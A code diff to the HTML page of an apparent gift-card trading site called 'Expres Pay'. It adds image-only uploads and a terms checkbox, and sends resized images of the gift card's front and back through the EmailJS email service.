@@ -11,7 +11,7 @@
     <!-- Include Tailwind CSS -->
     <script src="https://cdn.tailwindcss.com"></script>
     <!-- Include Email.js -->
-    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
     <link rel="stylesheet" href="main.css">
     <!-- Initialize EmailJS -->
     <script>
@@ -228,6 +228,7 @@
             type="file" 
             id="front-image" 
             class="w-full px-4 py-3 border rounded focus:ring-2 focus:ring-yellow-300 text-xs"
+            accept="image/*"
         >
     </div>
 
@@ -237,6 +238,7 @@
             type="file" 
             id="back-image" 
             class="w-full px-4 py-3 border rounded focus:ring-2 focus:ring-yellow-300 text-xs"
+            accept="image/*"
         >
     </div>
 
@@ -250,6 +252,37 @@
         >
     </div>
 </form>
+
+<!-- Terms and Conditions -->
+<div class="mb-4 bg-gray-50 p-4 border border-gray-300 rounded">
+    <p class="text-xs text-gray-700 mb-2">
+        By proceeding with this transaction, you agree to the following terms and conditions:
+    </p>
+    <ul class="list-disc list-inside text-xs text-gray-700 mb-2">
+        <li>You confirm that the gift card details provided are accurate and belong to you.</li>
+        <li>You understand that incorrect or invalid card details may result in delays or rejection of the trade.</li>
+        <li>Expres Pay reserves the right to validate all submitted cards and may request additional verification if required.</li>
+        <li>All submitted images of the gift card must be clear and free from obstructions to ensure a smooth transaction.</li>
+        <li>By submitting this form, you consent to our <a href="#" class="text-yellow-500 underline hover:text-yellow-600">Privacy Policy</a> and the processing of your personal data for this trade.</li>
+    </ul>
+    <label class="flex items-center text-xs text-gray-700">
+        <input 
+            type="checkbox" 
+            id="accept-terms" 
+            class="mr-2 rounded border-gray-300 text-yellow-500 focus:ring-2 focus:ring-yellow-300"
+        >
+        I have read and agree to the <a href="#" class="text-yellow-500 underline hover:text-yellow-600">Terms and Conditions</a>.
+    </label>
+</div>
+
+<script>
+    document.getElementById('accept-terms').addEventListener('change', function () {
+    const redeemButton = document.getElementById('redeem-button');
+    redeemButton.disabled = !this.checked;
+});
+
+</script>
+
 
 
                 <button type="submit" id="redeem-button" class="w-full py-4 bg-yellow-500 text-white font-semibold rounded shadow-md hover:bg-yellow-600 focus:outline-none focus:ring-2 focus:ring-yellow-300 text-xs">
@@ -289,32 +322,152 @@
     }
 
     // Handle form submission with EmailJS
-    document.getElementById('giftCardTradeForm').addEventListener('submit', function(event) {
-        event.preventDefault();
-        const cardType = document.getElementById('card-type').value;
-        const amount = document.getElementById('amount').value;
-        const email = document.getElementById('registered-email').value;
+    // document.getElementById('giftCardTradeForm').addEventListener('submit', function(event) {
+    //     event.preventDefault();
+    //     const cardType = document.getElementById('card-type').value;
+    //     const amount = document.getElementById('amount').value;
+    //     const email = document.getElementById('registered-email').value;
 
-        if (!cardType || !amount || !email) {
-            alert('Please fill in all fields.');
+    //     if (!cardType || !amount || !email) {
+    //         alert('Please fill in all fields.');
+    //         return;
+    //     }
+
+    //     // Prepare the email data
+    //     const templateParams = {
+    //         cardType: cardType,
+    //         amount: amount,
+    //         email: email
+    //     };
+
+    //     // Send the email
+    //     emailjs.send('service_f2x5e1i', 'template_d0igltm', templateParams)
+    //         .then(function(response) {
+    //             alert('Email sent successfully!');
+    //         }, function(error) {
+    //             alert('Failed to send email: ' + JSON.stringify(error));
+    //         });
+    // });
+    document.getElementById('redeem-button').addEventListener('click', async () => {
+    // Get uploaded files
+        const frontImageInput = document.getElementById('front-image').files[0];
+        const backImageInput = document.getElementById('back-image').files[0];
+        const registeredEmail = document.getElementById('registered-email').value;
+
+        // Validate input
+        if (!frontImageInput || !backImageInput) {
+            alert('Please upload both front and back images of the gift card.');
             return;
         }
 
-        // Prepare the email data
-        const templateParams = {
-            cardType: cardType,
-            amount: amount,
-            email: email
-        };
+        if (!registeredEmail) {
+            alert('Please enter a registered email address.');
+            return;
+        }
 
-        // Send the email
-        emailjs.send('service_f2x5e1i', 'template_d0igltm', templateParams)
-            .then(function(response) {
-                alert('Email sent successfully!');
-            }, function(error) {
-                alert('Failed to send email: ' + JSON.stringify(error));
-            });
+    //     try {
+    //         // Convert images to Base64
+    //         const frontImageBase64 = await convertToBase64(frontImageInput);
+    //         const backImageBase64 = await convertToBase64(backImageInput);
+
+    //         // Prepare email parameters
+    //         const emailParams = {
+    //             to_email: registeredEmail,
+    //             message: 'Gift card images uploaded successfully.',
+    //             front_image: frontImageBase64,
+    //             back_image: backImageBase64,
+    //         };
+
+    //         // Send email
+    //         emailjs.send('service_f2x5e1i', 'template_d0igltm', emailParams)
+    //             .then((response) => {
+    //                 console.log('Email sent successfully!', response.status, response.text);
+    //                 alert('Gift card images sent successfully!');
+    //             })
+    //             .catch((error) => {
+    //                 console.error('Error sending email:', error);
+    //                 alert('Failed to send email. Please try again.');
+    //             });
+    //     } catch (error) {
+    //         console.error('Error processing images:', error);
+    //         alert('Failed to process images. Please try again.');
+    //     }
+    // });
+
+    // // Helper function to convert file to Base64
+    // function convertToBase64(file) {
+    //     return new Promise((resolve, reject) => {
+    //         const reader = new FileReader();
+    //         reader.onload = () => resolve(reader.result.split(',')[1]); // Get Base64 string without prefix
+    //         reader.onerror = (error) => reject(error);
+    //         reader.readAsDataURL(file);
+    //     });
+    // }
+    try {
+            const frontImageBase64 = await resizeImage(frontImageInput, 300, 300, 0.5);
+            const backImageBase64 = await resizeImage(backImageInput, 300, 300, 0.5);
+
+            if (frontImageBase64.length > 50000 || backImageBase64.length > 50000) {
+                alert('Compressed image size exceeds 50KB. Please use smaller images.');
+                return;
+            }
+
+            const emailParams = {
+                to_email: registeredEmail,
+                message: 'Gift card images uploaded successfully.',
+                front_image: frontImageBase64,
+                back_image: backImageBase64,
+            };
+
+            emailjs.send('service_f2x5e1i', 'template_d0igltm', emailParams)
+                .then((response) => {
+                    console.log('Email sent successfully!', response.status, response.text);
+                    alert('Gift card images sent successfully!');
+                })
+                .catch((error) => {
+                    console.error('Error sending email:', error);
+                    alert('Failed to send email. Please try again.');
+                });
+        } catch (error) {
+            console.error('Error processing images:', error);
+            alert('Failed to process images. Please try again.');
+        }
     });
+
+    function resizeImage(file, maxWidth = 300, maxHeight = 300, quality = 0.5) {
+        return new Promise((resolve, reject) => {
+            const reader = new FileReader();
+            reader.onload = (event) => {
+                const img = new Image();
+                img.onload = () => {
+                    const canvas = document.createElement('canvas');
+                    const ctx = canvas.getContext('2d');
+
+                    let { width, height } = img;
+
+                    if (width > maxWidth || height > maxHeight) {
+                        if (width > height) {
+                            height = Math.round((height * maxWidth) / width);
+                            width = maxWidth;
+                        } else {
+                            width = Math.round((width * maxHeight) / height);
+                            height = maxHeight;
+                        }
+                    }
+
+                    canvas.width = width;
+                    canvas.height = height;
+                    ctx.drawImage(img, 0, 0, width, height);
+
+                    resolve(canvas.toDataURL('image/jpeg', quality).split(',')[1]); // Further compression
+                };
+                img.onerror = reject;
+                img.src = event.target.result;
+            };
+            reader.onerror = reject;
+            reader.readAsDataURL(file);
+        });
+    }
 </script>
 
 <!-- JavaScript for Tab Functionality -->
